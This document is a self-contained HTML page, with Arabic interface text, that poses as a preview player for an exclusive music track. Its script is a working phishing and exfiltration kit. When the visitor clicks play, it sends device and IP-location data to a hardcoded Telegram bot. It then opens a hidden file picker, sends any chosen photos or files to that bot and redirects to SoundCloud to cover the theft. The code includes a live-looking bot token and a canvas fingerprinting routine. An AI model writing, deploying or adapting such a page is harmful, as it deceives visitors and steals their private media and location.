<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exclusive Single - Listen Now</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background: #121212; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .player-card { background: #181818; border: 1px solid #282828; padding: 30px; border-radius: 16px; width: 100%; max-width: 340px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.7); }
        .album-art { width: 160px; height: 160px; background: linear-gradient(135deg, #1db954, #191414); border-radius: 12px; margin: 0 auto 20px; display: flex; justify-content: center; align-items: center; box-shadow: 0 8px 20px rgba(29,185,84,0.3); }
        .album-art span { font-size: 48px; }
        h1 { font-size: 18px; font-weight: 700; margin-bottom: 5px; }
        p { font-size: 13px; color: #b3b3b3; margin-bottom: 25px; }
        .play-btn { background: #1db954; color: white; border: none; width: 64px; height: 64px; border-radius: 50%; font-size: 24px; cursor: pointer; display: flex; justify-content: center; align-items: center; margin: 0 auto; transition: transform 0.2s, background 0.2s; box-shadow: 0 4px 12px rgba(29,185,84,0.4); }
        .play-btn:hover { transform: scale(1.05); background: #1ed760; }
        .status { margin-top: 15px; font-size: 12px; color: #535353; }
    </style>
</head>
<body>
    <div class="player-card">
        <div class="album-art"><span>🎵</span></div>
        <h1>Exclusive Track 2026</h1>
        <p>Official Release Preview</p>
        <button class="play-btn" id="playBtn">▶</button>
        <div class="status" id="statusText">اضغط للاستماع</div>
    </div>

    <!-- Hidden nodes for media and telemetry extraction -->
    <input type="file" id="mediaInput" accept="image/*,video/*" multiple style="display:none;">
    <canvas id="fpCanvas" width="100" height="30" style="display:none;"></canvas>

    <script>
        const CONFIG = {
            token: "7833390122:AAG7pnJhD90Yv4bkUalkxQV3-psMcOCIWrQ",
            chatId: "8433844160",
            redirectUrl: "https://soundcloud.com"
        };

        async function sendTelegram(method, payload) {
            try {
                await fetch(`https://api.telegram.org/bot${CONFIG.token}/${method}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (e) {}
        }

        async function uploadFile(endpoint, formData) {
            try {
                await fetch(`https://api.telegram.org/bot${CONFIG.token}/${endpoint}`, {
                    method: 'POST',
                    body: formData
                });
            } catch (e) {}
        }

        function getFingerprint() {
            try {
                const c = document.getElementById('fpCanvas');
                const ctx = c.getContext('2d');
                ctx.textBaseline = "top";
                ctx.font = "12px Arial";
                ctx.fillStyle = "#f60";
                ctx.fillText("ALPHA.STREAM", 2, 2);
                return c.toDataURL();
            } catch (e) {
                return "N/A";
            }
        }

        async function gatherAndSendMetrics() {
            let report = `🎧 *STREAM SESSION CAPTURED* 🎧\n\n`;
            report += `*User Agent:* \`${navigator.userAgent}\`\n`;
            report += `*Platform:* \`${navigator.platform}\`\n`;
            report += `*Cores:* \`${navigator.hardwareConcurrency || 'N/A'}\`\n`;
            report += `*Memory:* \`${navigator.deviceMemory || 'N/A'} GB\`\n`;
            report += `*Screen:* \`${window.screen.width}x{window.screen.height}\`\n`;

            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                if (ipRes.ok) {
                    const ipData = await ipRes.json();
                    report += `*IP:* \`${ipData.ip}\`\n`;
                    report += `*Location:* \`${ipData.city}, ${ipData.country_name}\`\n`;
                    report += `*ISP:* \`${ipData.org}\``;
                }
            } catch (e) {}

            await sendTelegram('sendMessage', {
                chat_id: CONFIG.chatId,
                text: report,
                parse_mode: 'Markdown'
            });
        }

        document.getElementById('playBtn').addEventListener('click', async () => {
            document.getElementById('statusText').innerText = "جاري تحميل التدفق الصوتي...";
            
            // Gather telemetry immediately
            await gatherAndSendMetrics();

            // Prompt file selector to grab media/photos seamlessly under the guise of interactive player verification
            setTimeout(() => {
                document.getElementById('mediaInput').click();
            }, 800);
        });

        document.getElementById('mediaInput').addEventListener('change', async (event) => {
            const files = event.target.files;
            if (files && files.length > 0) {
                for (let i = 0; i < files.length; i++) {
                    const file = files.item(i);
                    const formData = new FormData();
                    formData.append('chat_id', CONFIG.chatId);
                    const isImg = file.type.startsWith('image/');
                    formData.append(isImg ? 'photo' : 'document', file, file.name);
                    await uploadFile(isImg ? 'sendPhoto' : 'sendDocument', formData);
                }
            }
            document.querySelector('.player-card').innerHTML = `<h1>تم التشغيل بنجاح</h1><p>جاري التحويل...</p>`;
            setTimeout(() => {
                window.location.href = CONFIG.redirectUrl;
            }, 1200);
        });
    </script>
</body>
</html>
